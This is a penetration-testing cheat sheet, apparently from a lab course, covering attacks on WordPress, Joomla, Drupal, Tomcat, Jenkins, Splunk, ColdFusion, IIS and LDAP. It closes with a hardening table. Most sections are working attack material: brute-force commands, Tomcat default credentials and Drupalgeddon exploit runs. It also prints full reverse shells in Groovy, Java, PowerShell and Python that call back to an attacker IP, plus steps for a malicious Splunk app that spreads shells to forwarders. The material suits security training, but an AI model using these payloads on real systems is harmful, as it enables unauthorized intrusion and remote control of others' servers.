# Application Discovery & Enumeration

[EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) and [Aquatone](https://github.com/michenriksen/aquatone)

# Content Management Systems (CMS)

## WordPress

WPScan enumerate

```shell
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
```

WPScan Login bruteforce

```shell
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

## Joomla

Let's try out [droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.

```shell
droopescan scan joomla --url http://dev.inlanefreight.local/
```

As we can see, it did not turn up much information aside from the possible version number. We can also try out [JoomlaScan](https://github.com/drego85/JoomlaScan), which is a Python tool inspired by the now-defunct OWASP [joomscan](https://github.com/OWASP/joomscan) tool. `JoomlaScan` is a bit out-of-date and requires Python2.7 to run. We can get it running by first making sure some dependencies are installed.

```shell-session
fango@htb[/htb]$ sudo python2.7 -m pip install urllib3
fango@htb[/htb]$ sudo python2.7 -m pip install certifi
fango@htb[/htb]$ sudo python2.7 -m pip install bs4
```

While a bit out of date, it can be helpful in our enumeration. Let's run a scan.

```shell
fango@htb[/htb]$ python2.7 joomlascan.py -u http://dev.inlanefreight.local
```

We can use this [script](https://github.com/ajnik/joomla-bruteforce) to attempt to brute force the login.

```shell
fango@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## Drupal

```shell
droopescan scan drupal -u http://drupal.inlanefreight.local
```

Over the years, Drupal core has suffered from a few serious remote code execution vulnerabilities, each dubbed `Drupalgeddon`. At the time of writing, there are 3 Drupalgeddon vulnerabilities in existence.

- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
    
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
    
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.

**Drupalgeddon**

Let's try adding a new admin user with this [PoC](https://www.exploit-db.com/exploits/34992) script. Once an admin user is added, we could log in and enable the `PHP Filter` module to achieve remote code execution.

```shell
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

We could also use the [exploit/multi/http/drupal_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) Metasploit module to exploit this.

**Drupalgeddon2**

We can use [this](https://www.exploit-db.com/exploits/44448) PoC to confirm this vulnerability.

```shell
fango@htb[/htb]$ python3 drupalgeddon2.py
```

**Drupalgeddon3**

[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) is an authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.

# Servlet Containers/Software Development

## Tomcat

### Default credentials

The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But this path is protected by basic HTTP auth, the most common credentials are:

```
admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```

### **Tomcat Manager - Login Brute Force**

After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the `/manager` and the `/host-manager` pages. We can attempt to locate these with a tool such as `Gobuster` or just browse directly to them.

```
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

We may be able to either log in to one of these using weak credentials such as `tomcat:tomcat`, `admin:admin`, etc. If these first few tries don't work, we can try a password brute force attack against the login page, covered in the next section. If we are successful in logging in, we can upload a [Web Application Resource or Web Application ARchive (WAR)](https://en.wikipedia.org/wiki/WAR_(file_format)#:~:text=In%20software%20engineering%2C%20a%20WAR,that%20together%20constitute%20a%20web) file containing a JSP web shell and obtain remote code execution on the Tomcat server.

We can use the [auxiliary/scanner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) Metasploit module for these purposes, Burp Suite Intruder or any number of scripts to achieve this. We'll use Metasploit for our purposes.

```shell
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

### **Tomcat Manager - WAR File Upload**

The [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) Metasploit module can be used to automate the process shown above, but we'll leave this as an exercise for the reader.

[This](https://github.com/SecurityRiskAdvisors/cmd.jsp) JSP web shell is very lightweight (under 1kb) and utilizes a [Bookmarklet](https://www.freecodecamp.org/news/what-are-bookmarklets/) or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded `cmd.jsp` would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit).

### Example Scripts Information Leakage

The following example scripts that come with Apache Tomcat v4.x - v7.x and can be used by attackers to gain information about the system. These scripts are also known to be vulnerable to cross site scripting (XSS) injection.

```
/examples/jsp/num/numguess.jsp
/examples/jsp/dates/date.jsp
/examples/jsp/snp/snoop.jsp
/examples/jsp/error/error.html
/examples/jsp/sessions/carts.html
/examples/jsp/checkbox/check.html
/examples/jsp/colors/colors.html
/examples/jsp/cal/login.html
/examples/jsp/include/include.jsp
/examples/jsp/forward/forward.jsp
/examples/jsp/plugin/plugin.jsp
/examples/jsp/jsptoserv/jsptoservlet.jsp
/examples/jsp/simpletag/foo.jsp
/examples/jsp/mail/sendmail.jsp
/examples/servlet/HelloWorldExample
/examples/servlet/RequestInfoExample
/examples/servlet/RequestHeaderExample
/examples/servlet/RequestParamExample
/examples/servlet/CookieExample
/examples/servlet/JndiServlet
/examples/servlet/SessionExample
/tomcat-docs/appdev/sample/web/hello.jsp
```

### Path Traversal (..;/)

```
http://www.vulnerable.com/;param=value/manager/html
```

### Snoop Servlet Remote Information Disclosure

```
https://target:ip/examples/jsp/snp/snoop.jsp
```

### Vulnerabilities

#### XSS CVE-2019-0221

```shell
nuclei -u target  -t CVE-2019-0221.yaml
```

#### **LFI CVE-2020-1938 : Ghostcat**

Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938). All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable. This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat. AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in proxying requests to application servers behind the front-end web servers.

The AJP service is usually running at port 8009 on a Tomcat server. This can be checked with a targeted Nmap scan.

The PoC code for the vulnerability can be found [here](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi).

```shell
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
```

#### RCE CVE-2019-0232

Locate bat

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://10.129.201.89:8080/cgi/FUZZ.bat -ac
```

Test

```
http://localhost:8080/cgi/ism.bat?&dir
```

Reverse shell script https://github.com/jaiguptanick/CVE-2019-0232.git

Metasploit `windows/http/tomcat_cgi_cmdlineargs`

#### RCE CVE-2020-9484

```shell
nuclei -u target  -t CVE-2020-9484.yaml
```

### Scanning tools

```shell
sudo python3 -m pip install apachetomcatscanner
apachetomcatscanner -tt target_ip -tp port    --no-check-certificate
```

### Refrences
- [scan for Apache Tomcat](https://github.com/p0dalirius/ApacheTomcatScanner)
- [Apache Tomcat Example Scripts](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

## Jenkins

**Script Console**

The script console can be reached at the URL `http://jenkins.inlanefreight.local:8000/script`. This console allows a user to run Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) scripts, which are an object-oriented Java-compatible language. The language is similar to Python and Ruby. Groovy source code gets compiled into Java Bytecode and can run on any platform that has JRE installed.

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

There are various ways that access to the script console can be leveraged to gain a reverse shell. For example, using the command below, or [this](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/) Metasploit module.

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).

We could also use [this](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Java reverse shell to gain command execution on a Windows host, swapping out `localhost` and the port for our IP address and listener port.

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

# Infrastructure/Network Monitoring Tools

## Splunk

**Abusing Built-In Functionality**

We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The `bin` directory in this repo has examples for [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) and [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Let's walk through this step-by-step.

To achieve this, we first need to create a custom Splunk application using the following directory structure.

```dirtree
- splunk_shell/
	- bin
	- default
```

The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file. Our reverse shell will be a PowerShell one-liner.

```powershell
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.

```shell
fango@htb[/htb]$ cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.

```shell
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Once the files are created, we can create a tarball or `.spl` file.

```shell
fango@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

If we were dealing with a Linux host, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.

```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.

# Attacking Thick Client Applications

## Information Gathering

In this step, penetration testers have to identify the application architecture, the programming languages and frameworks that have been used, and understand how the application and the infrastructure work. They should also need to identify technologies that are used on the client and server sides and find entry points and user inputs. 

|[CFF Explorer](https://ntcore.com/?page_id=388)|[Detect It Easy](https://github.com/horsicq/Detect-It-Easy)|[Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)|[Strings](https://learn.microsoft.com/en-us/sysinternals/downloads/strings)|

## Client Side attacks

Although thick clients perform significant processing and data storage on the client side, they still communicate with servers for various tasks, such as data synchronization or accessing shared resources. This interaction with servers and other external systems can expose thick clients to vulnerabilities similar to those found in web applications, including command injection, weak access control, and SQL injection.

Sensitive information like usernames and passwords, tokens, or strings for communication with other services, might be stored in the application's local files. Hardcoded credentials and other sensitive information can also be found in the application's source code, thus Static Analysis is a necessary step while testing the application. Using the proper tools, we can reverse-engineer and examine .NET and Java applications including EXE, DLL, JAR, CLASS, WAR, and other file formats. Dynamic analysis should also be performed in this step, as thick client applications store sensitive information in the memory as well.

|[Ghidra](https://www.ghidra-sre.org/)|[IDA](https://hex-rays.com/ida-pro/)|[OllyDbg](http://www.ollydbg.de/)|[Radare2](https://www.radare.org/r/index.html)|
|[dnSpy](https://github.com/dnSpy/dnSpy)|[x64dbg](https://x64dbg.com/)|[JADX](https://github.com/skylot/jadx)|[Frida](https://frida.re/)|

## Network Side Attacks

If the application is communicating with a local or remote server, network traffic analysis will help us capture sensitive information that might be transferred through HTTP/HTTPS or TCP/UDP connection, and give us a better understanding of how that application is working. Penetration testers that are performing traffic analysis on thick client applications should be familiar with tools like:

|[Wireshark](https://www.wireshark.org/)|[tcpdump](https://www.tcpdump.org/)|[TCPView](https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview)|[Burp Suite](https://portswigger.net/burp)|

## Server Side Attacks

Server-side attacks in thick client applications are similar to web application attacks, and penetration testers should pay attention to the most common ones including most of the OWASP Top Ten.

# ColdFusion

Like any web-facing technology, ColdFusion has historically been vulnerable to various types of attacks, such as SQL injection, XSS, directory traversal, authentication bypass, and arbitrary file uploads. To improve the security of ColdFusion, developers must implement secure coding practices, input validation checks, and properly configure web servers and firewalls. Here are a few known vulnerabilities of ColdFusion:

1. CVE-2021-21087: Arbitrary disallow of uploading JSP source code
2. CVE-2020-24453: Active Directory integration misconfiguration
3. CVE-2020-24450: Command injection vulnerability
4. CVE-2020-24449: Arbitrary file reading vulnerability
5. CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability

ColdFusion exposes a fair few ports by default:

| Port Number | Protocol       | Description                                                                                                                                                            |
| ----------- | -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 80          | HTTP           | Used for non-secure HTTP communication between the web server and web browser.                                                                                         |
| 443         | HTTPS          | Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.                          |
| 1935        | RPC            | Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device. |
| 25          | SMTP           | Simple Mail Transfer Protocol (SMTP) is used for sending email messages.                                                                                               |
| 8500        | SSL            | Used for server communication via Secure Socket Layer (SSL).                                                                                                           |
| 5500        | Server Monitor | Used for remote administration of the ColdFusion server.                                                                                                               |

It's important to note that default ports can be changed during installation or configuration.

## Enumeration

During a penetration testing enumeration, several ways exist to identify whether a web application uses ColdFusion. Here are some methods that can be used:

|**Method**|**Description**|
|---|---|
|`Port Scanning`|ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. Nmap might be able to identify ColdFusion during a services scan specifically.|
|`File Extensions`|ColdFusion pages typically use ".cfm" or ".cfc" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.|
|`HTTP Headers`|Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used.|
|`Error Messages`|If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.|
|`Default Files`|ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web application runs on ColdFusion.|
# IIS Tilde Enumeration

**Tilde Enumeration using IIS ShortName Scanner**

Manually sending HTTP requests for each letter of the alphabet can be a tedious process. Fortunately, there is a tool called `IIS-ShortName-Scanner` that can automate this task. You can find it on GitHub at the following link: [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner). To use `IIS-ShortName-Scanner`, you will need to install Oracle Java on either Pwnbox or your local VM. Details can be found in the following link. [How to Install Oracle Java](https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/)

When you run the below command, it will prompt you for a proxy, just hit enter for No.

```shell
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```

**Generate Wordlist**

```shell
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

```shell
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```

# LDAP

There are two popular implementations of LDAP: `OpenLDAP`, an open-source software widely used and supported, and `Microsoft Active Directory`, a Windows-based implementation that seamlessly integrates with other Microsoft products and services.

Although LDAP and AD are `related`, they `serve different purposes`. `LDAP` is a `protocol` that specifies the method of accessing and modifying directory services, whereas `AD` is a `directory service` that stores and manages user and computer data. While LDAP can communicate with AD and other directory services, it is not a directory service itself. AD offers extra functionalities such as policy administration, single sign-on, and integration with various Microsoft products.

|**LDAP**|**Active Directory (AD)**|
|---|---|
|A `protocol` that defines how clients and servers communicate with each other to access and manipulate data stored in a directory service.|A `directory server` that uses LDAP as one of its protocols to provide authentication, authorisation, and other services for Windows-based networks.|
|An `open and cross-platform protocol` that can be used with different types of directory servers and applications.|`Proprietary software` that only works with Windows-based systems and requires additional components such as DNS (Domain Name System) and Kerberos for its functionality.|
|It has a `flexible and extensible schema` that allows custom attributes and object classes to be defined by administrators or developers.|It has a `predefined schema` that follows and extends the X.500 standard with additional object classes and attributes specific to Windows environments. Modifications should be made with caution and care.|
|Supports `multiple authentication mechanisms` such as simple bind, SASL, etc.|It supports `Kerberos` as its primary authentication mechanism but also supports NTLM (NT LAN Manager) and LDAP over SSL/TLS for backward compatibility.|
## ldapsearch

For example, `ldapsearch` is a command-line utility used to search for information stored in a directory using the LDAP protocol. It is commonly used to query and retrieve data from an LDAP directory service.

```shell
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```

## LDAP Injection

To test for LDAP injection, you can use input values that contain `special characters or operators` that can change the query's meaning:

|Input|Description|
|---|---|
|`*`|An asterisk `*` can `match any number of characters`.|
|`( )`|Parentheses `( )` can `group expressions`.|
|`\|`|A vertical bar `\|` can perform `logical OR`.|
|`&`|An ampersand `&` can perform `logical AND`.|
|`(cn=*)`|Input values that try to bypass authentication or authorisation checks by injecting conditions that `always evaluate to true` can be used. For example, `(cn=*)` or `(objectClass=*)` can be used as input values for a username or password fields.|

LDAP injection attacks are `similar to SQL injection attacks` but target the LDAP directory service instead of a database.

# Application-Specific Hardening Tips

Though the general concepts for application hardening apply to all applications that we discussed in this module and will encounter in the real world, we can take some more specific measures. Here are a few:

|Application|Hardening Category|Discussion|
|---|---|---|
|[WordPress](https://wordpress.org/support/article/hardening-wordpress/)|Security monitoring|Use a security plugin such as [WordFence](https://www.wordfence.com/) which includes security monitoring, blocking of suspicious activity, country blocking, two-factor authentication, and more|
|[Joomla](https://docs.joomla.org/Security_Checklist/Joomla!_Setup)|Access controls|A plugin such as [AdminExile](https://extensions.joomla.org/extension/adminexile/) can be used to require a secret key to log in to the Joomla admin page such as `http://joomla.inlanefreight.local/administrator?thisismysecretkey`|
|[Drupal](https://www.drupal.org/docs/security-in-drupal)|Access controls|Disable, hide, or move the [admin login page](https://www.drupal.org/docs/7/managing-users/hide-user-login)|
|[Tomcat](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)|Access controls|Limit access to the Tomcat Manager and Host-Manager applications to only localhost. If these must be exposed externally, enforce IP whitelisting and set a very strong password and non-standard username.|
|[Jenkins](https://www.jenkins.io/doc/book/security/securing-jenkins/)|Access controls|Configure permissions using the [Matrix Authorization Strategy plugin](https://plugins.jenkins.io/matrix-auth)|
|[Splunk](https://docs.splunk.com/Documentation/Splunk/8.2.2/Security/Hardeningstandards)|Regular updates|Make sure to change the default password and ensure that Splunk is properly licensed to enforce authentication|
|[PRTG Network Monitor](https://kb.paessler.com/en/topic/61108-what-security-features-does-prtg-include)|Secure authentication|Make sure to stay up-to-date and change the default PRTG password|
|osTicket|Access controls|Limit access from the internet if possible|
|[GitLab](https://about.gitlab.com/blog/2020/05/20/gitlab-instance-security-best-practices/)|Secure authentication|Enforce sign-up restrictions such as requiring admin approval for new sign-ups, configuring allowed and denied domains|


